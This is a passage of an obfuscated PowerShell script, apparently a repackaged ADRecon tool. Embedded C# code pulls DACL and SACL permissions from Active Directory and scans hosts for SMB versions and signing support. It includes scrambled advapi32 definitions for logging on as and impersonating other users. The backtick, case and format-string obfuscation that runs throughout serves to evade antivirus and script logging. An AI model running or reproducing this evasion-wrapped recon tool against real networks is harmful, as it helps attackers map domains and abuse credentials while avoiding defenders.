                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("Owner", Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("DistinguishedName", AdObject.Properties["distinguishedname"][0]));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    string Name = null;
                    string Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties["name"][0]);

                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Properties["displayname"][0]);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("AuditFlags", Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
"@


${Pi`NGcaSt`l`ESMB`Sc`ANNeR`sO`UrCe} = @"

        [StructLayout(LayoutKind.Explicit)]
		struct SMB_Header {
			[FieldOffset(0)]
			public UInt32 Protocol;
			[FieldOffset(4)]
			public byte Command;
			[FieldOffset(5)]
			public int Status;
			[FieldOffset(9)]
			public byte  Flags;
			[FieldOffset(10)]
			public UInt16 Flags2;
			[FieldOffset(12)]
			public UInt16 PIDHigh;
			[FieldOffset(14)]
			public UInt64 SecurityFeatures;
			[FieldOffset(22)]
			public UInt16 Reserved;
			[FieldOffset(24)]
			public UInt16 TID;
			[FieldOffset(26)]
			public UInt16 PIDLow;
			[FieldOffset(28)]
			public UInt16 UID;
			[FieldOffset(30)]
			public UInt16 MID;
		};
		// https://msdn.microsoft.com/en-us/library/cc246529.aspx
		[StructLayout(LayoutKind.Explicit)]
		struct SMB2_Header {
			[FieldOffset(0)]
			public UInt32 ProtocolId;
			[FieldOffset(4)]
			public UInt16 StructureSize;
			[FieldOffset(6)]
			public UInt16 CreditCharge;
			[FieldOffset(8)]
			public UInt32 Status; // to do SMB3
			[FieldOffset(12)]
			public UInt16 Command;
			[FieldOffset(14)]
			public UInt16 CreditRequest_Response;
			[FieldOffset(16)]
			public UInt32 Flags;
			[FieldOffset(20)]
			public UInt32 NextCommand;
			[FieldOffset(24)]
			public UInt64 MessageId;
			[FieldOffset(32)]
			public UInt32 Reserved;
			[FieldOffset(36)]
			public UInt32 TreeId;
			[FieldOffset(40)]
			public UInt64 SessionId;
			[FieldOffset(48)]
			public UInt64 Signature1;
			[FieldOffset(56)]
			public UInt64 Signature2;
		}
        [StructLayout(LayoutKind.Explicit)]
		struct SMB2_NegotiateRequest
		{
			[FieldOffset(0)]
			public UInt16 StructureSize;
			[FieldOffset(2)]
			public UInt16 DialectCount;
			[FieldOffset(4)]
			public UInt16 SecurityMode;
			[FieldOffset(6)]
			public UInt16 Reserved;
			[FieldOffset(8)]
			public UInt32 Capabilities;
			[FieldOffset(12)]
			public Guid ClientGuid;
			[FieldOffset(28)]
			public UInt64 ClientStartTime;
			[FieldOffset(36)]
			public UInt16 DialectToTest;
		}
		const int SMB_COM_NEGOTIATE	= 0x72;
		const int SMB2_NEGOTIATE = 0;
		const int SMB_FLAGS_CASE_INSENSITIVE = 0x08;
		const int SMB_FLAGS_CANONICALIZED_PATHS = 0x10;
		const int SMB_FLAGS2_LONG_NAMES					= 0x0001;
		const int SMB_FLAGS2_EAS							= 0x0002;
		const int SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED	= 0x0010	;
		const int SMB_FLAGS2_IS_LONG_NAME					= 0x0040;
		const int SMB_FLAGS2_ESS							= 0x0800;
		const int SMB_FLAGS2_NT_STATUS					= 0x4000;
		const int SMB_FLAGS2_UNICODE						= 0x8000;
		const int SMB_DB_FORMAT_DIALECT = 0x02;
		static byte[] GenerateSmbHeaderFromCommand(byte command)
		{
			SMB_Header header = new SMB_Header();
			header.Protocol = 0x424D53FF;
			header.Command = command;
			header.Status = 0;
			header.Flags = SMB_FLAGS_CASE_INSENSITIVE | SMB_FLAGS_CANONICALIZED_PATHS;
			header.Flags2 = SMB_FLAGS2_LONG_NAMES | SMB_FLAGS2_EAS | SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED | SMB_FLAGS2_IS_LONG_NAME | SMB_FLAGS2_ESS | SMB_FLAGS2_NT_STATUS | SMB_FLAGS2_UNICODE;
			header.PIDHigh = 0;
			header.SecurityFeatures = 0;
			header.Reserved = 0;
			header.TID = 0xffff;
			header.PIDLow = 0xFEFF;
			header.UID = 0;
			header.MID = 0;
			return getBytes(header);
		}
		static byte[] GenerateSmb2HeaderFromCommand(byte command)
		{
			SMB2_Header header = new SMB2_Header();
			header.ProtocolId = 0x424D53FE;
			header.Command = command;
			header.StructureSize = 64;
			header.Command = command;
			header.MessageId = 0;
			header.Reserved = 0xFEFF;
			return getBytes(header);
		}
		static byte[] getBytes(object structure)
		{
			int size = Marshal.SizeOf(structure);
			byte[] arr = new byte[size];
			IntPtr ptr = Marshal.AllocHGlobal(size);
			Marshal.StructureToPtr(structure, ptr, true);
			Marshal.Copy(ptr, arr, 0, size);
			Marshal.FreeHGlobal(ptr);
			return arr;
		}
		static byte[] getDialect(string dialect)
		{
			byte[] dialectBytes = Encoding.ASCII.GetBytes(dialect);
			byte[] output = new byte[dialectBytes.Length + 2];
			output[0] = 2;
			output[output.Length - 1] = 0;
			Array.Copy(dialectBytes, 0, output, 1, dialectBytes.Length);
			return output;
		}
		static byte[] GetNegotiateMessage(byte[] dialect)
		{
			byte[] output = new byte[dialect.Length + 3];
			output[0] = 0;
			output[1] = (byte) dialect.Length;
			output[2] = 0;
			Array.Copy(dialect, 0, output, 3, dialect.Length);
			return output;
		}
		// MS-SMB2  2.2.3 SMB2 NEGOTIATE Request
		static byte[] GetNegotiateMessageSmbv2(int DialectToTest)
		{
			SMB2_NegotiateRequest request = new SMB2_NegotiateRequest();
			request.StructureSize = 36;
			request.DialectCount = 1;
			request.SecurityMode = 1; // signing enabled
			request.ClientGuid = Guid.NewGuid();
			request.DialectToTest = (UInt16) DialectToTest;
			return getBytes(request);
		}
		static byte[] GetNegotiatePacket(byte[] header, byte[] smbPacket)
		{
			byte[] output = new byte[smbPacket.Length + header.Length + 4];
			output[0] = 0;
			output[1] = 0;
			output[2] = 0;
			output[3] = (byte)(smbPacket.Length + header.Length);
			Array.Copy(header, 0, output, 4, header.Length);
			Array.Copy(smbPacket, 0, output, 4 + header.Length, smbPacket.Length);
			return output;
		}
		public static bool DoesServerSupportDialect(string server, string dialect)
		{
			Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect);
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmbHeaderFromCommand(SMB_COM_NEGOTIATE);
				byte[] dialectEncoding = getDialect(dialect);
				byte[] negotiatemessage = GetNegotiateMessage(dialectEncoding);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if (stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				byte[] negotiateresponse = new byte[3];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
				if (negotiateresponse[1] == 0 && negotiateresponse[2] == 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV1 dialect " + dialect + " = Not supported");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb1 is not supported on " + server);
			}
		}
		public static bool DoesServerSupportDialectWithSmbV2(string server, int dialect, bool checkSMBSigning)
		{
			Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2"));
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(server, 445);
			}
			catch (Exception)
			{
				throw new Exception("port 445 is closed on " + server);
			}
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] header = GenerateSmb2HeaderFromCommand(SMB2_NEGOTIATE);
				byte[] negotiatemessage = GetNegotiateMessageSmbv2(dialect);
				byte[] packet = GetNegotiatePacket(header, negotiatemessage);
				stream.Write(packet, 0, packet.Length);
				stream.Flush();
				byte[] netbios = new byte[4];
				if( stream.Read(netbios, 0, netbios.Length) != netbios.Length)
                {
                    return false;
                }
				byte[] smbHeader = new byte[Marshal.SizeOf(typeof(SMB2_Header))];
				if (stream.Read(smbHeader, 0, smbHeader.Length) != smbHeader.Length)
                {
                    return false;
                }
				if (smbHeader[8] != 0 || smbHeader[9] != 0 || smbHeader[10] != 0 || smbHeader[11] != 0)
				{
					Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Not supported via error code");
					return false;
				}
				byte[] negotiateresponse = new byte[6];
				if (stream.Read(negotiateresponse, 0, negotiateresponse.Length) != negotiateresponse.Length)
                {
                    return false;
                }
                if (checkSMBSigning)
                {
                    // https://support.microsoft.com/en-in/help/887429/overview-of-server-message-block-signing
                    // https://msdn.microsoft.com/en-us/library/cc246561.aspx
				    if (negotiateresponse[2] == 3)
				    {
					    Trace.WriteLine("Checking " + server + " for SMBV2 SMB Signing dialect 0x" + dialect.ToString("X2") + " = Supported");
					    return true;
				    }
                    else
                    {
                        return false;
                    }
                }
				int selectedDialect = negotiateresponse[5] * 0x100 + negotiateresponse[4];
				if (selectedDialect == dialect)
				{
					Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Supported");
					return true;
				}
				Trace.WriteLine("Checking " + server + " for SMBV2 dialect 0x" + dialect.ToString("X2") + " = Not supported via not returned dialect");
				return false;
			}
			catch (Exception)
			{
				throw new ApplicationException("Smb2 is not supported on " + server);
			}
		}
		public static bool SupportSMB1(string server)
		{
			try
			{
				return DoesServerSupportDialect(server, "NT LM 0.12");
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB2(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0202, false) || DoesServerSupportDialectWithSmbV2(server, 0x0210, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static bool SupportSMB3(string server)
		{
			try
			{
				return (DoesServerSupportDialectWithSmbV2(server, 0x0300, false) || DoesServerSupportDialectWithSmbV2(server, 0x0302, false) || DoesServerSupportDialectWithSmbV2(server, 0x0311, false));
			}
			catch (Exception)
			{
				return false;
			}
		}
		public static string Name { get { return "smb"; } }
		public static PSObject GetPSObject(Object IPv4Address)
		{
            string computer = Convert.ToString(IPv4Address);
            PSObject DCSMBObj = new PSObject();
            if (computer == "")
            {
                DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                DCSMBObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                return DCSMBObj;
            }
            bool isPortOpened = true;
			bool SMBv1 = false;
			bool SMBv2_0x0202 = false;
			bool SMBv2_0x0210 = false;
			bool SMBv3_0x0300 = false;
			bool SMBv3_0x0302 = false;
			bool SMBv3_0x0311 = false;
            bool SMBSigning = false;
			try
			{
				try
				{
					SMBv1 = DoesServerSupportDialect(computer, "NT LM 0.12");
				}
				catch (ApplicationException)
				{
				}
				try
				{
					SMBv2_0x0202 = DoesServerSupportDialectWithSmbV2(computer, 0x0202, false);
					SMBv2_0x0210 = DoesServerSupportDialectWithSmbV2(computer, 0x0210, false);
					SMBv3_0x0300 = DoesServerSupportDialectWithSmbV2(computer, 0x0300, false);
					SMBv3_0x0302 = DoesServerSupportDialectWithSmbV2(computer, 0x0302, false);
					SMBv3_0x0311 = DoesServerSupportDialectWithSmbV2(computer, 0x0311, false);
				}
				catch (ApplicationException)
				{
				}
			}
			catch (Exception)
			{
				isPortOpened = false;
			}
			if (SMBv3_0x0311)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0311, true);
			}
			else if (SMBv3_0x0302)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0302, true);
			}
			else if (SMBv3_0x0300)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0300, true);
			}
			else if (SMBv2_0x0210)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0210, true);
			}
			else if (SMBv2_0x0202)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0202, true);
			}
            DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", isPortOpened));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", SMBv1));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", SMBv2_0x0202));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", SMBv2_0x0210));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", SMBv3_0x0300));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", SMBv3_0x0302));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", SMBv3_0x0311));
            DCSMBObj.Members.Add(new PSNoteProperty("SMB Signing", SMBSigning));
            return DCSMBObj;
		}
	}
}
"@







${aD`VAP`I`32dEf} = ((("{82}{112}{47}{11}{106}{113}{77}{97}{41}{74}{95}{17}{108}{50}{60}{78}{59}{96}{30}{61}{37}{114}{125}{53}{44}{29}{124}{5}{49}{54}{85}{13}{86}{48}{99}{1}{120}{7}{121}{94}{46}{100}{23}{63}{38}{68}{10}{9}{116}{39}{20}{79}{58}{8}{0}{51}{12}{22}{104}{93}{117}{67}{16}{24}{52}{81}{6}{4}{64}{15}{27}{92}{111}{105}{66}{69}{21}{19}{87}{28}{115}{43}{89}{90}{72}{18}{118}{34}{110}{103}{84}{123}{40}{35}{73}{3}{25}{36}{98}{88}{109}{127}{102}{122}{76}{75}{119}{57}{14}{80}{126}{101}{83}{91}{71}{45}{56}{55}{62}{31}{33}{32}{26}{65}{70}{42}{2}{107}" -f'ide',' str','f()',' hToke','S',' Logon','57','g lp','rov','rd,','swo',' ',', ','ing l','o','32.dll','   ','ll57S','ool ','p','T','
    ','out In',' ','[DllIm','n','R','57S','li','tern bo',' ','n ','ool ','b','rs','r',');',' publ','ing lp','gon','se','pi3','ToSel','t','x','ta','ma','  ','name','User','etLast','r','po','c e','(','ic e','t','dll57S, SetLastErr','t dwLogonP','= true','Error',' ','xter','str','advapi','ever',' true)','
 ','szPas',']','t','
    public s','b','(IntPtr','2','rt(57Sadv','o','ort(57S',' ','ype, in','r = ','rt(','A',')','ateLoggedO','str','pszUser','ub','
 ','atic ext','ern ',']',', SetL','r p','zDo','.d',')]
 ','adva','
',',','in,','ue','l','n','tPt','tError =','[D',';
AXt',', S',' ','o','as','Xt
 ','llImp','ic st','c s',' int dwLo','hToken);
','Impe','api32.','in','s','Imp','nU','ol','ati','tr','  [Dl'))-rePlAce ([chAR]53+[chAR]55+[chAR]83),[chAR]34 -crePlACe ([chAR]65+[chAR]88+[chAR]116),[chAR]39)



${KERN`el32`D`Ef} = ((("{5}{13}{6}{20}{11}{17}{4}{19}{14}{16}{10}{15}{0}{8}{7}{9}{18}{3}{2}{1}{12}"-f'ubl','ct','je','b','2.dll{0}, SetLa','{1}
    [Dl','t({0}',' stati','ic','c extern bo','r = true)','l',');
{1}','lImpor','Er',']
    p','ro','3','ol CloseHandle(IntPtr hO','st','kerne'))-f[Char]34,[Char]39)

Function gE`T-`d`ATEDIFf
{

    param (
        [Parameter(MaNdAtoRy = ${Tr`UE})]
        [DateTime] ${D`AtE1},

        [Parameter(MaNdAtoRy = ${t`RUe})]
        [DateTime] ${dA`Te2}
    )

    If (${d`ATE2} -gt ${dA`TE1})
    {
        ${d`DI`FF} = ${d`A`Te2} - ${d`ATe1}
    }
    Else
    {
        ${D`dIFf} = ${DA`Te1} - ${Da`T`E2}
    }
    Return ${D`d`IFF}
}

Function gET-`DN`ToF`qDn
{

    param(
        [Parameter(MAnDaTory = ${t`Rue})]
        [string] ${AdOB`jEcT`Dn}
    )

    ${I`N`dEX} = ${aDOB`JEct`dn}.("{0}{1}" -f'IndexO','f').Invoke('DC=')
    If (${I`N`Dex})
    {
        ${aD`OBJeC`Td`Nd`Om`AInN`AME} = $(${ado`BJe`CTdn}.("{0}{2}{1}"-f 'SubSt','ng','ri').Invoke(${I`NdEX})) -replace 'DC=','' -replace ',','.'
    }
    Else
    {
        
        [array] ${AdObjECtdnA`R`Ray} = ${a`do`B`JECtdN} -Split ("DC=")
        ${A`dObjEct`dnaRRaY} | &("{0}{2}{1}"-f 'For','t','Each-Objec') {
            [array] ${TE`mp} = ${_} -Split (",")
            [string] ${A`dOB`jEc`T`DN`ArrAYItemdoMa`innAmE} += ${Te`MP}[0] + "."
        }
        ${a`doBjEcTdn`doMa`iNNa`mE} = ${adOb`JEcT`DNaR`RaYiteM`d`OMA`in`NA`mE}.("{0}{1}{2}"-f'S','ubstrin','g').Invoke(1, ${ado`BJ`eC`TDn`ARRA`YitE`Md`o`MaI`NnamE}."L`Ength" - 2)
    }
    Return ${ADobJ`E`cT`DnDoMAinN`AME}
}

Function e`xP`Ort-aDRcSv
{

    param(
        [Parameter(MANdAtOry = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [PSObject] ${AdrO`Bj},

        [Parameter(mANdAtory = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [String] ${Ad`FILe`Na`ME}
    )

    Try
    {
        ${AD`RObj} | &("{1}{2}{0}"-f 'v','Expo','rt-Cs') -Path ${a`D`FiLEnAmE} -NoTypeInformation -Encoding ("{1}{0}" -f'ult','Defa')
    }
    Catch
    {
        &("{1}{0}{2}{3}"-f'i','Wr','te-','Warning') "[Export-ADRCSV] Failed to export $($ADFileName). "
        &("{0}{2}{1}"-f 'Write-Ve','e','rbos') "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function eXporT-A`dRx`mL
{

    param(
        [Parameter(MANdAtory = ${T`RUE})]
        [ValidateNotNullOrEmpty()]
        [PSObject] ${A`d`RoBj},

        [Parameter(MaNDaTory = ${TR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String] ${ad`FiL`Ena`mE}
    )

    Try
    {
        (&("{1}{0}{2}{3}" -f'To','Convert','-Xm','l') -NoTypeInformation -InputObject ${adr`O`Bj}).("{1}{0}"-f've','Sa').Invoke(${Adf`iLE`NAMe})
    }
    Catch
    {
        &("{3}{0}{2}{1}" -f'ite','ning','-War','Wr') "[Export-ADRXML] Failed to export $($ADFileName). "
        &("{4}{3}{0}{2}{1}" -f'b','se','o','Ver','Write-') "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function exPO`RT-`Ad`RJS`On
{

    param(
        [Parameter(maNDATorY = ${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [PSObject] ${a`D`RObJ},

        [Parameter(MANdAtOry = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [String] ${Ad`F`il`enamE}
    )

    Try
    {
        &("{2}{0}{4}{3}{1}" -f'o','JSON','C','ertTo-','nv') -InputObject ${ad`ROBJ} | &("{1}{0}{2}" -f 't-Fil','Ou','e') -FilePath ${Adf`i`LEnAMe}
    }
    Catch
    {
        &("{0}{2}{1}"-f 'Wr','rning','ite-Wa') "[Export-ADRJSON] Failed to export $($ADFileName). "
        &("{3}{1}{2}{0}"-f 'e','Verbo','s','Write-') "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function eXP`oRT`-`AD`Rhtml
{

    param(
        [Parameter(mANdATORY = ${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [PSObject] ${adr`Obj},

        [Parameter(ManDaTory = ${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [String] ${A`DfiL`Ena`me},

        [Parameter(maNDAtoRy = ${F`ALSe})]
        [String] ${AD`RO`Utput`DIR} = ${N`ULL}
    )

${h`EAder} = @"
<style type="text/css">
th {
	color:white;
	background-color:blue;
}
td, th {
	border:0px solid black;
	border-collapse:collapse;
	white-space:pre;
}
tr:nth-child(2n+1) {
    background-color: #dddddd;
}
tr:hover td {
    background-color: #c1d5f8;
}
table, tr, td, th {
	padding: 0px;
	margin: 0px;
	white-space:pre;
}
table {
	margin-left:1px;
}
</style>
"@
    Try
    {
        If (${a`D`FilEn`Ame}.("{1}{0}{2}"-f'ont','C','ains').Invoke(("{1}{0}" -f 'dex','In')))
        {
            ${h`Tml`PATH}  = -join(${a`D`R`OUtpUtdir},'\',("{1}{2}{0}" -f'-Files','H','TML'))
            ${h`T`MlPaTH} = $((&("{2}{0}{1}" -f'vert-Pat','h','Con') ${hTM`lpA`Th}).("{1}{2}{0}" -f'nd','Trim','E').Invoke("\"))
            ${H`Tmlfi`les} = &("{3}{1}{2}{0}" -f'm','et-Chil','dIte','G') -Path ${H`TML`PatH} -name
            ${hT`Ml} = ${H`TMlFi`Les} | &("{4}{3}{2}{0}{1}" -f 'tT','o-HTML','r','nve','Co') -Title ("{0}{1}"-f 'A','DRecon') -Property @{("{0}{1}"-f'Lab','el')=("{0}{4}{2}{1}{3}"-f 'T','ent','of Cont','s','able ');("{2}{0}{1}"-f'xpressi','on','E')={"<a href='$($_)'>$($_)</a> "}} -Head ${h`EA`DEr}

            &("{1}{0}" -f 'pe','Add-Ty') -AssemblyName ("{1}{0}{2}"-f 'stem','Sy','.Web')
              (  iTeM  VariABLE:eM73).VaLUE::("{1}{0}{2}"-f 'tm','H','lDecode').Invoke(${H`Tml}) | &("{1}{2}{0}"-f '-File','O','ut') -FilePath ${aD`Fi`LeNA`mE}
        }
        Else
        {
            If (${A`DRo`Bj} -is [array])
            {
                ${ADR`O`BJ} | &("{2}{1}{0}" -f't','jec','Select-Ob') ('*') | &("{0}{3}{2}{1}{4}"-f 'C','-','o','onvertT','HTML') -As ("{0}{1}"-f 'T','able') -Head ${hE`ADer} | &("{0}{1}{2}" -f 'Out-Fi','l','e') -FilePath ${adF`ILe`NAMe}
            }
            Else
            {
                &("{3}{1}{2}{0}"-f'L','er','tTo-HTM','Conv') -InputObject ${A`Dr`obJ} -As ("{0}{1}"-f 'Ta','ble') -Head ${H`eaD`ER} | &("{1}{0}"-f'ile','Out-F') -FilePath ${A`DFIlEnA`me}
            }
        }
    }
    Catch
    {
        &("{2}{4}{0}{3}{1}"-f'arn','g','Write-','in','W') "[Export-ADRHTML] Failed to export $($ADFileName). "
        &("{0}{3}{1}{2}"-f'Wri','erbos','e','te-V') "[EXCEPTION] $($_.Exception.Message) "
    }
}

Function eXpO`Rt-`ADR
{

    param(
        [Parameter(mAndAToRy = ${TR`UE})]
        [PSObject] ${AD`ROBj},

        [Parameter(mANdATORy = ${tr`UE})]
        [String] ${a`DROuTp`UtDIR},

        [Parameter(MaNdatorY = ${TR`Ue})]
        [array] ${OUtPUT`T`YPE},

        [Parameter(mAnDatory = ${tr`UE})]
        [String] ${aD`RM`Odu`leNa`me}
    )

    Switch (${OUt`p`UTTypE})
    {
        ("{1}{0}"-f'T','STDOU')
        {
            If (${AdRmOD`UlEn`A`ME} -ne ("{1}{0}{3}{2}"-f 't','Abou','DRecon','A'))
            {
                If (${A`dro`BJ} -is [array])
                {
                    
                    ${aDR`o`BJ} | &("{1}{2}{0}"-f 'g','Out','-Strin') -Stream
                }
                Else
                {
                    
                    ${AD`R`Obj} | &("{2}{0}{1}" -f 'at','-List','Form') | &("{3}{2}{1}{0}" -f 'ng','-Stri','ut','O') -Stream
                }
            }
        }
        'CSV'
        {
            ${ADF`I`le`NAmE}  = -join(${adroUt`Put`Dir},'\',("{2}{1}{0}"-f'iles','F','CSV-'),'\',${aDr`MO`DUlenaMe},("{1}{0}" -f'csv','.'))
            &("{3}{0}{2}{1}"-f 'port-','CSV','ADR','Ex') -ADRObj ${Adr`obj} -ADFileName ${a`D`FIle`NAMe}
        }
        'XML'
        {
            ${A`Df`Il`enAMe}  = -join(${adro`UTP`U`T`DiR},'\',("{2}{1}{0}{3}"-f'l','L-Fi','XM','es'),'\',${aDRm`ODUlen`Ame},("{1}{0}"-f'l','.xm'))
            &("{0}{2}{1}{3}" -f 'E','t-A','xpor','DRXML') -ADRObj ${aDr`obJ} -ADFileName ${A`DfIl`EnaME}
        }
        ("{0}{1}"-f'JSO','N')
        {
            ${AdF`il`EnAmE}  = -join(${a`D`ROu`TP`UTdIr},'\',("{2}{0}{3}{1}" -f '-','es','JSON','Fil'),'\',${aDr`Mo`DUle`NA`me},("{1}{0}" -f 'on','.js'))
            &("{2}{3}{1}{0}{4}"-f 'JS','ADR','Export','-','ON') -ADRObj ${ad`ROBj} -ADFileName ${aDfil`e`N`AmE}
        }
        ("{1}{0}"-f'TML','H')
        {
